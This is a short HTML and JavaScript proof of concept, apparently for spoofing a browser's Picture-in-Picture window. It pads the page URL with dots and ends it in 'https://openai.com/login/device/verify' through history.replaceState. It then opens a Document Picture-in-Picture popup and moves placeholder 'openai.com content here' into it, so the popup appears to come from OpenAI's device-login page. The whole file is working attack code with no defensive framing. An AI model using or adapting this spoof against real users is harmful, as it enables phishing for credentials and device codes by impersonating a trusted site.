<style>
    #content {
        display: none;
    }
</style>

<button id="button">Open PIP</button>

<div id="content">
    openai.com content here
</div>

<script>
    const pipOpen = async () => {
        history.replaceState(null, '', '?...............................https://openai.com/login/device/verify');

        const pipWindow = await documentPictureInPicture.requestWindow({
            width: 330,
            height: 317
        });
        
        setTimeout(() => {
            history.replaceState(null, '', '/');
        }, 1000);

        pipWindow.document.body.append(content);
    };

    button.onclick = pipOpen;
</script>
